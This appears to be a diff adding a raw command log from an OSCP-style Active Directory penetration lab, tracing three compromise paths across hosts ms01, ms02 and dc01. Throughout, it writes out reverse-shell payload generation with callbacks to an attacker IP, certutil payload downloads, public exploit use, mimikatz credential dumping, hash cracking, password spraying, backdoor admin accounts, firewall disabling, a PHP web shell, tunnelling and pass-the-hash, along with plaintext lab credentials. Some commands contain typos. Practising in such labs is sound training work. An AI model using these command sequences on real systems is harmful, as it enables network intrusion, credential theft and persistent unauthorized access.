@@ -1,0 +1,672 @@
+----------------------------------------- PATH 1 ---------------------------------------------------
+cd Desktop
+mkdir ad_lab
+cd ad_lab
+mkdir vpn ms01 ms02 dc01
+ll
+cd vpn
+mv ~/Downloads/profile.ovpn .
+ll
+sudo OpenVPN *.ovpn
+
+cd Desktop/ad_lab/ms01
+ll
+mkdir enu loot files exploits
+ll
+
+sudo vim /etc/hosts
+ping -c 2 ms01
+sudo nmap -T4 -p- -v ms01 -oN enu/nmap-ports.log
+sudo nmap -T4 -p80,443,1978-1980 -sCV -v ms01 -oN enu/nmap-services.log
+
+cd Desktop/ad_lab/ms01
+gobuster dir -u http://ms01 -w /usr/share/dirb/wordlists/common.txt | tee enu/gobuster-p80.log
+gobuster dir -u http://ms01 -w /usr/share/dirb/wordlists/common.txt
+mv ~/Downloads/file.exe .
+exiftool file.exe
+
+searchsploit remote mouse 3.008
+cd ../exploits
+searchsploit -x 46697
+mkdir ~/Desktop/ad_lab/payloads
+cd ~/Desktop/ad_lab/payloads
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=172.16.11.11 LPORT=443 -f exe -o winrev443.exe
+ll
+python -m http.server 80
+cd ~/Desktop/ad_lab/exploits/
+searchsploit -m 46697
+vim 46697.py
+python2 46697.py
+python2 46697.py ms01
+nc -nvlp 443
+whoami
+whoami /priv
+
+cd ~/Desktop/ad_lab/ms01/payloads
+mv /Downloads/winPEASx64.exe ./winpeas.exe
+python -m http.server 80
+certuril.exe -urlcache -f http://172.16.11.11/winpeas.exe winpeas.exe
+winpeas.exe
+sc query | findstr /i wise
+sc qc wisebootassistant
+cd C:\apps\wise
+copy \users\public\win443.exe .\Wise.exe
+shutdown -r -t 0
+nc -nvlp 443
+whoami
+dir /s /b proof.txt
+type C:\Users\Administrator\Desktop\proof.txt
+whoami
+ipconfig
+hostname
+
+dir C:\Users
+cd C:\Users\wyldstyle
+tree /f /a
+dir /s/b *.log
+type C:\Users\wyldstyle\AppData\Roaming\Microsoft\Windows\PowerShell\PsReadLine\ConsoleHost_history.txt
+$pass = ConvertTo-SecureString "Awesome24!" -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential("wyldstyle",$pass)
+Enter-PSSession -ComputerName MS03 -Credential $cred
+cd ~/Downloads
+ll
+7z x ligolo-ng_agent_0.4.4_windows_amd64.zip
+ll
+mv agent.exe ~/Desktop/ad_lab/payloads
+gunzip -d ligolo-ng_agent_0.4.4_linux_amd64.zip
+ll
+sudo mv proxy /usr/bin/
+ll
+rm ./*
+ll
+proxy --help
+sudo ip tuntap add user kali mode tun ligolo
+sudo ip link set ligolo up
+ifconfig
+cd ~/Desktop/ad_lab/payloads
+ll
+sudo python -m http.server 80
+proxy -selfcert
+cd C:\Users\Public
+certutil.exe -urlcache -f http://172.16.11.11/agent.exe agent.exe
+agent.exe -connect 172.16.11.11:11601 -retry -ignore-cert
+session
+1
+ifconfig
+start
+sudo ip route add 10.10.1.0/24 dev ligolo
+ip route
+
+cd Desktop/ad_lab/dc01
+mkdir enu loot files exploits
+ping -c 2 dc01
+sudo nmap -T4 -p- -sCV --open -v dc01 -oN enu/nmap-ports-versions.log
+cd Desktop/ad_lab/ms02
+mkdir enu files loot exploits
+sudo nmap -p- -sCV -v ms02 -oN enu/nmap-ports-versions.log
+cd Desktop/ad_lab/dc01
+smbclient -L //dc01 -U oscp/wyldstyle
+smbclient //dc01 -U oscp/wyldstyle
+dir
+exit
+smbclient -L //ms02 -U oscp/wyldstyle
+smbclient //ms02 -U oscp/wyldstyle
+cd ~/Desktop/ad_lab/dc01
+impacket-GetUserSPNs -request -dc-ip dc01 oscp.lab/wyldstyle
+vim hashes
+cat hashes
+hashid hashes
+impacket-GetNPUsers -request -dc-ip dc01 oscp.lab/wyldstyle
+vim hashes.asrep
+cat hashes.asrep
+hashcat hashes.asrep /usr/share/wordlists/rockyou.txt
+hashcat hashes.asrep /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+hashcat hashes /usr/share/wordlists/rockyou.txt
+crackmapexec
+vim users
+vim passwords
+crackmapexec smb 10.10.1.200 -u users -p passwords --continue-on-success
+crackmapexec smb 10.10.1.202 -u users -p passwords --continue-on-success
+smbclient //dc01/backups -U oscp/svc_iis
+dir
+get it-users.zip
+exit
+ll
+mv it-users.zip dc01/files
+cd dc01/files
+ll
+7z x it-users.zip
+ll
+zip2john it-users.zip > it-users.hash
+cat it-users.hash
+john it-users.hash --wordlist=/usr/share/wordlists/rockyou.txt
+7z x it-users.zip
+cat it-users.txt
+cat it-users.txt | cut -d ':' -f 1 > users
+cat it-users.txt | cut -d ':' -f 2 > password
+crackmapexec smb 10.10.1.200-10.10.1.202 -u users -p passwords -d oscp.lab --continue-on-success
+
+impacket-psexec oscp/emmet@10.10.1.202
+whoami
+hostname
+cd \users\
+dir
+cd lord_business
+dir
+cd Desktop
+dir
+type proof.txt
+whoami
+ipconfig
+hostname
+exit
+cd ~/Desktop/ad_lab/ms02/loot
+vim proof.txt
+
+impacket-psexec oscp/emmet@10.10.1.202
+dir /s/b lord_business\*.txt
+net user
+net user /domain
+net user lord_business /domain
+cd ~/Desktop/ad_lab/ms02/enu
+impacket-secretsdump oscp/emmet@10.10.1.202
+evil-winrm -i 10.10.1.200 -u lord_business -p TAKOStuesday!
+tree /f /a Administrator
+cd administrator\Desktop
+type proof.txt
+whoami
+ipconfig
+hostname
+download proof.txt
+exit
+mv proof.txt ../../dc01/loot
+cd ../../dc01/loot
+cat proof.txt
+
+firefox http://ms01
+firefox http://ms01/phpMyAdmin/
+firefox http://ms01/dashboard/phpinfo.php
+
+
+----------------------------------------- PATH 2 ---------------------------------------------------
+
+cd Desktop
+mkdir ad
+cd ad
+mkdir vpn
+cd vpn
+mv ~/Downloads/profile.ovpn .
+ll
+sudo OpenVPN *.ovpn
+
+sudo vim /etc/hosts
+ping -c 2 ms01
+sudo nmap -Pn -T4 -v -p- ms01 -oN enu/nmap-ports.log
+sudo nmap -Pn -v -p21,80,8094 -sCV ms01  -oN enu/nmap-ports-fingerprint.log
+
+cd Desktop/ad/ms01
+gobuster dir -u http://ms01 -r -w /usr/share/dirb/wordlists/common.txt | tee enu/gobuster-common.log
+gobuster dir -u http://ms01 -r -w /usr/share/dirb/wordlists/big.txt | tee enu/gobuster-big.log
+curl http://ms01
+
+nc ms01 8094
+ftp admin@ms01
+exit
+ftp anonymous@ms01
+exit
+ftp gale@ms01
+exit
+hydra -l gale -P /usr/share/wordlists/rockyou.txt ftp://ms01
+ftp gale@ms01
+dir
+get backup.zip
+exit
+mkdir files
+mv backup.zip files
+cd files
+ll
+7z x backup.zip
+ll
+file diskbossent_setup_v8.8.16.exe
+exiftool diskbossent_setup_v8.8.16.exe
+
+searchsploit diskboss 8.8.16
+searchsploit -x 43478
+cd ../
+mkdir exploits
+cd exploits/
+searchsploit -m 43478
+vim 43478.py
+msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=172.16.11.11 LPORT=443 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b '\x00'
+mousepad 43478.py
+nc -nvlp 443
+python2 43478.py
+
+whoami
+whoami /priv
+net user
+net localgroup
+net localgroup Administrators
+cd \users
+dir
+cd gale
+dir searches
+type searches\*
+cd ..
+mkdir staging
+mv ~/Downloads/winPEASx64.exe .
+ll
+python -m http.server -d . 80
+certutil.exe -f -urlcache http://172.16.11.11 /winPEAS64.exe winpeas.exe
+.\winpeas.exe
+schtasks /query /fo LIST /v /TN "FTP Backup"
+type C:\Users\gale\AppData\Local\Scripts\backup.bat
+ll
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=172.16.11.11 LPORT=443 -f exe -o winrev443.exe
+python -m http.server -d . 80
+certutil.exe -f -urlcache http://172.16.11.11/winrev443.exe winrev443.exe
+cd \users\gale\appdata\local\scripts\
+type backup.bat
+echo C:\Users\Public\winrev443.exe > backup.bat
+type backup.bat
+nc -nvlp 443
+whoami
+cd \users
+dir /s/b local.txt
+dir /s/b proof.txt
+dir /s/b *.txt
+net user
+
+net user /add backdoor Password1
+net localgroup administrators /add backdoor
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal server" /v "fDenyTSConnections" /t REG_DWORD /d 0 /f
+netsh advfirewall set allprofiles state off
+sudo nmap ms01 -p3389
+xfreerdp /v:ms01 /u:backdoor /p:Password1 +clipboard /cert:ignore
+cd ../staging
+ll
+mv ~/Download/mimikatz.exe .
+ll
+file mimikatz.exe
+python -m http.server -d . 80
+cd \users\public
+certutil.exe -f -urlcache http://172.16.11.11/mimikatz.exe mimi.exe
+mimi.exe
+privilege::debug
+log
+lsadump::lsa /inject
+sekurlsa::logonpasswords
+exit
+type mimikatz.log | findstr /i wade
+cd..
+vim wade.hash
+hashcat wade.hash /usr/share/wordlist/rockyou.txt -m 1000
+runas /user:oscp\wade cmd.exe
+net users/domain
+
+cd ~/Downloads
+7z x ligolo-ng_agent_0.4.4_windows_amd64.zip
+ll
+rm LICENSE READ.md
+ll
+rm ligolo-ng_agent_0.4.4_windows_amd64.zip
+ll
+mv agent.exe ~/Desktop/ad/staging
+ll
+tar -xzvf ligolo-ng_agent_0.4.4_linux_amd64.zip
+sudo mv proxy /usr/bin/
+proxy --help
+rm ./*
+ll
+cd ~/Desktop/ad/staging
+python -m http.server -d . 80
+impacket-smbserver -smb2support stage .
+\\172.16.11.11\stage
+cd ~/Desktop
+cd ms01
+sudo ip tuntap add user kali mode tun ligolo
+sudo ip link set ligolo up
+proxy -selfcert
+agent.exe -connect 172.16.11.11:11601 -retry -ignore-cert
+session
+1
+ifconfig
+start
+sudo ip route add 10.10.1.0/24 dev ligolo
+route
+ping -c 2 10.10.1.200
+
+impacket-GetUserSPNs -request -dc-ip 10.10.1.200 oscp.lab/wade
+impacket-GetNPUsers oscp.lab/wade
+impacket-GetNPUsers oscp.lab/wade -outputfile bernie.asrep
+ll
+cat bernie.asrep
+cd ../
+hashcat bernie.asrep /usr/share/wordlists/rockyou.txt
+
+cd dc01
+mkdir enu
+sudo nmap -T4 -p- -v 10.10.1.200 -oN enu/nmap-ports.log
+cd ms02
+mkdir enu
+sudo nmap -T4 -v -p- 10.10.1.202 -oN enu/nmap-ports.log
+cd Desktop/ad
+vim users
+
+crackmapexec smb 10.10.1.200
+crackmapexec smb -u users -p passwords --continue-on-success 10.10.1.200
+crackmapexec smb -u users -p passwords --continue-on-success 10.10.1.200 --shares
+enum4linux -A 10.10.1.200
+enum4linux -A 10.10.1.200 -u wade -p Seawater!
+smbclient -L \\10.10.1.200 -U oscp/wade
+
+crackmapexec winrm 10.10.1.200
+
+crackmapexec rdp -u users -p passwords --continue-on-success 10.10.1.202
+xfreerdp /v:10.10.1.202 /u:bernie /d:oscp.lab /p:f1r3pl4c3 +clipboard /cert:ignore
+xfreerdp /v:10.10.1.202 /u:wade /d:oscp.lab /p:Seawater! +clipboard /cert:ignore
+net user
+net user wade /domain
+net localgroup Administrators
+runas /user:oscp\bernie cmd.exe
+whoami
+whoami /priv
+whoami /all
+mkdir test
+mkdir test
+dir test
+net user /add backdoor Password1
+net localgroup Administrators /add backdoor
+
+net share public=c:\users\public /GRANT:Everyone,FULL
+net share
+\\MS01\public
+cd C:\Users\Public
+mimi.exe
+privilege::debug
+log
+lsadump::lsa /inject
+sekurlsa::logonpasswords
+type mimikatz.log | findstr /i Administrator
+
+cd Desktop
+cd ad
+vim administrator.hash
+hashid administrator.hash
+hashcat administrator.hash /usr/share/wordlists/rockyou.txt -m 1000
+hashcat administrator.hash /usr/share/wordlists/rockyou.txt -m 1000 -r /usr/share/hashcat/rules/best64.rule
+
+evil-winrm -i 10.10.1.200 -u administrator -H 2345hjkh2345jkh25432
+whoami
+hostname
+dir /s/b \users\ proof.txt
+cd ..\
+dir desktop
+
+------------------------------------- PATH 2 - MISC ---------------------------------------------------
+
+listener_list
+listener_add --addr 0.0.0.0:8888 --to 127.0.0.1:80
+listener_list
+python -m http.server -d . 80
+certutil.exe -f urlcache http://ms01:8888/winrev443.exe winrev443.exe
+dir
+listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:443
+listener_list
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.1.201 LPORT=4444 -f exe -o winrev4444ms01.exe
+nc -nvlp 443
+evil-winrm -i 10.10.1.200 -u administrator -H 2345hjkh2345jkh25432
+upload winrev4444ms01.exe
+dir
+.\winrev4444ms01.exe
+whoami
+hostname
+exit
+listener_add --addr 0.0.0.0:8888 --to 127.0.0.1:80
+python -m http.server -d . 80
+certutil.exe -f -urlcache http://ms01:8888/winrev4444ms01.exe winrev4444ms01.exe
+.\winrev4444ms01.exe
+msfvenom -p windows/x64/shell_bind_tcp LHOST=0.0.0.0 LPORT=4440 -f exe -o winbind4440.exe
+python -m http.server -d . 80
+netsh advfirewall set allprofiles state off
+certutil.exe -f -urlcache http://ms01:8888/winbind4440.exe winbind4440.exe
+.\winbind4440.exe
+netstat -naob
+nc 10.10.1.202 4440
+whoami
+hostname
+exit
+
+----------------------------------------- PATH 3 ---------------------------------------------------
+
+cd Desktop
+mkdir ad
+cd ad
+mkdir vpn
+mkdir ms01
+mkdir ms02
+mkdir dc01
+ll
+cd vpn
+mv ~/Downloads/profile.ovpn .
+ll
+sudo OpenVPN *.ovpn
+
+cd Desktop/ad/ms01
+mkdir enu files loot exploits
+touch creds users passwords hashes
+nmap -Pn -v -p- 192.168.100.201 -oN enu/nmap-ports.log
+nmap -Pn -v -p80,443 -sVC 192.168.100.201 -oN enu/nmap-versions.log
+gobuster dir -u http://192.168.100.201 -r -w /usr/share/wordlists/dirb/common.txt | tee enu/gobuster-p80.log
+grep -v 403 enu/gobuster-p80.log
+firefox http://192.168.100.201/uploads
+gobuster dir -u http://192.168.100.201 -r -w /usr/share/wordlists/dirb/big.txt | tee enu/gobuster-p80-big.log
+gobuster dir --help | grep -i cert
+gobuster dir -u https://192.168.100.201 -r -k -w /usr/share/wordlists/dirb/big.txt | tee enu/gobuster-p443-big.log
+curl http://192.168.100.201
+curl http://192.168.100.201/upload.php
+touch test1.txt
+touch test2.doc
+echo 'this is a test2' > test2.doc
+firefox http://192.168.100.201
+cat test2.doc
+cat ~/Downloads/test2.doc
+diff test2.doc ~/Downloads/test2.doc
+cd Desktop/ad/ms01
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=172.16.11.11 LPORT=443 -f exe -o winrev443.exe
+python -m http.server -p 80
+nc -nvlp 443
+hostname
+whoami /all
+dir
+del *.doc
+del *.exe
+tree /F \xampp\htdocs
+
+cd ~/Desktop/ad/
+mkdir stage
+cd stage
+mv ~/Downloads/winPEASx64.exe .
+python -m http.server -d . 80
+cd \Users
+dir
+whoami
+dir stuart
+(We are not able to see into stuart's profile, because we aren't local admin)
+net user
+cd public
+dir
+certutilexe -f -urlcache http://172.16.11.11/winPEASx64.exe winpeas.exe
+winpeas.exe
+cd \xampp
+dir
+type passwords.txt
+dir htdocs
+cd htdocs
+cacls .
+copy index.html index2.html
+sc query
+powershell.exe -ex bypass
+Get-CimInstance-ClassName win32_service
+Get-Service Apache2.4
+Get-CimInstance -ClassName CIM_Service
+nc -nvlp 443
+cd ..\
+dir
+del index2.html
+dir
+
+cat /usr/share/webshells/php/simple-backdoor.php
+cp /usr/share/webshells/php/simple-backdoor.php ~/Desktop/ad/stage
+certutil.exe -f -urlcache http://172.16.11.11/simple-backdoor.php simple.php
+firefox http://192.168.100.201/simple.php
+firefox http://192.168.100.201/simple.php?cmd=whoami
+curl http://192.168.100.201.simple.php
+curl http://192.168.100.201.simple.php?cmd=dir
+
+curl http://192.168.100.201.simple.php?cmd=uploads\\winrev443.exe
+nc -nvlp 443
+whoami
+hostname
+dir /s/b \proof.txt
+dir /s/b \local.txt
+net user /add backdoor Password123
+net localgroup Administrators /add backdoor
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal server" /v "fDenyTSConnections" /t REG_DWORD /d 0 /f
+netsh advfirewall set allprofiles state off
+xfreerdp /v:192.168.100.201 /u:backdoor /d:ms01 /p:Password123 +clipboard /cert:ignore
+whoami /all
+
+cd ~/Desktop/ad/stage
+ll
+mv ~/Downloads/* .
+ll
+rm test2.doc
+unzip ligolo-ng_agent_0.4.4_windows_amd64.zip
+rm *.zip LICENSE README.md
+ll
+tar -xvf ligolo-ng_agent_0.4.4_linux_amd64.zip
+rm *.zip LICENSE README.md
+sudo mv -f proxy /usr/bin/
+cd ~/Desktop/ad
+sudo ip tuntap add user kali mode tun ligolo
+set ip link set ligolo up
+route
+ip route
+sudo ip route add 10.10.1.0/24 dev ligolo
+ip route
+proxy -selfcert
+impacket-smb2server -smb2support stage .
+\\172.16.11.11\stage
+cd ..\public
+dir
+agent.exe -connect 172.16.11.11:11601 -retry -ignore-cert
+session
+1
+start
+ping -c 2 10.10.1.200
+ping -c 2 10.10.1.202
+whoami /all
+cd \Users
+dir
+dir stuart
+tree /F stuart
+cls
+dir /s/b c:\*.pdf
+dir /s/b c:\*.kdbx
+dir /s/b c:\*.zip
+dir /s/b c:\*.doc*
+whoami /all
+dir /A C:\$Recycle.Bin\
+dir /A C:\$Recycle.Bin\S-1-5-21-3902119089-3194977123-834544202-1003\
+type /A C:\$Recycle.Bin\S-1-5-21-3902119089-3194977123-834544202-1003\$I8I1KV.doc
+copy C:\$Recycle.Bin\S-1-5-21-3902119089-3194977123-834544202-1003\$I8I1KV.doc "C:\Users\Public\welcome_letter.doc"
+cd C:\Users\Public
+dir
+sudo systemctl start ssh
+scp welcome_letter.doc kali@172.16.11.11:/home/kali/Desktop/ad/ms01/files
+cd /home/kali/Desktop/ad/ms01/files
+ll
+office2john welcome_letter.doc > welcome_letter.doc.hash
+cat welcome_letter.doc.hash
+john --help | grep -i wordlist
+john welcome_letter.doc.hash --wordlists=/usr/share/wordlists/rockyou.txt
+john welcome_letter.doc.hash --wordlists=/usr/share/wordlists/rockyou.txt --rules
+john welcome_letter.doc.hash
+
+crackmapexec smb 10.10.1.200
+cd ~/Desktop/ad/dc01
+mkdir enu loot files exploits
+sudo nmap -Pn -v -p- -sCV --open 10.10.1.200 -oN enu/nmap-ports.log
+cd ~/Desktop/ad/ms02
+mkdir enu loot files exploits
+sudo nmap -Pn -v -p- -sCV --open 10.10.1.202 -oN enu/nmap-ports.log
+
+impacket-smbserver -smb2support stage .
+xfreerdp /v:192.168.100.201 /u:backdoor /d:ms01 /p:Password123 +clipboard /cert:ignore
+\\172.16.11.11\stage
+cd "C:\Users\Public\"
+.\mimikatz.exe
+log
+privilege::debug
+sekurlsa::logonpasswords
+lsadump::lsa /inject
+vim hashes
+vim users
+crackmapexec smb 10.10.1.200-10.10.1.202
+crackmapexec smb 10.10.1.200-10.10.1.202 -u users -p passwords --continue-on-success
+crackmapexec smb 10.10.1.200-10.10.1.202 -u users -H hashes --continue-on-success
+crackmapexec winrm 10.10.1.200-10.10.1.202
+crackmapexec winrm 10.10.1.200-10.10.1.202 -u users -H hashes --continue-on-success
+crackmapexec winrm 10.10.1.200-10.10.1.202 -u users -p passwords --continue-on-success
+
+cd ~/Desktop/ad/stage
+mv ~/Downloads/SharpHound-v* .
+\\172.16.11.11\stage
+whoami
+runas /user:oscp\minions cmd.exe
+cd C:\Users\Public
+cd SharpHound-v2.0.2
+SharpHound.exe -c All --domain oscp.lab --zipfilename sharp202.zip
+cd ..\SharpHound-v1.1.1
+SharpHound.exe -c All --domain oscp.lab --zipfilename sharp111.zip
+sudo apt update
+sudo apt install -y neo4j bloodhound
+neo4jstart
+bloodhound
+cd ~/Desktop/ad/ms02/exploits
+mv ~/Downloads/pyLAPS.py .
+python pyLAPS.py
+python pyLAPS.py --action get -d "oscp.lab" -u minions -p "B4nan@\!\!\!"
+impacket-psexec ms02\LADMIN@10.10.1.202
+runas /user:ms01\LADMIN cmd.exe
+whoami /all
+net rpc password "lucy" -U "oscp"/"minions"%"B4nan@!!!" -S "10.10.1.200"
+net rpc password "dr_nefario" -U "oscp"/"minions"%"B4nan@!!!" -S "10.10.1.200"
+crackmapexec smb 10.10.1.202 -u users -p passwords --continue-on-success
+crackmapexec smb 10.10.1.202 -u users -p passwords --shares
+crackmapexec rdp 10.10.1.202 -u users -p passwords --continue-on-success
+hydra -L users -P passwords rdp://10.10.1.202
+xfreerdp /v:10.10.1.202 /u:lucy /d:oscp /p:Password123@ +clipboard /cert:ignore
+whoami /all
+runas /user:ms01\LADMIN cmd.exe
+whoami
+net user LADMIN
+net user /add backdoor Password123
+net localgroup Administrators /add backdoor
+C:\Users
+cd C:\Users\Public
+.\mimikatz.exe
+privilege::debug
+log
+lsadump::lsa /inject
+sekurlsa::logonpasswords
+hashcat hashes /usr/share/wordlists/rockyou.txt -m 1000
+hashcat hashes /usr/share/wordlists/rockyou.txt -m 1000 -r /usr/share/hashcat/rules/best64.rule
+sudo nmap -Pn -v -p445 10.10.1.200
+impacket-psexec -hashes :42hjk1hk341jh2314hk1jlk234 gru@10.10.1.200
+whoami
+hostname
+cd \users\
+cd administrator
+cd desktop
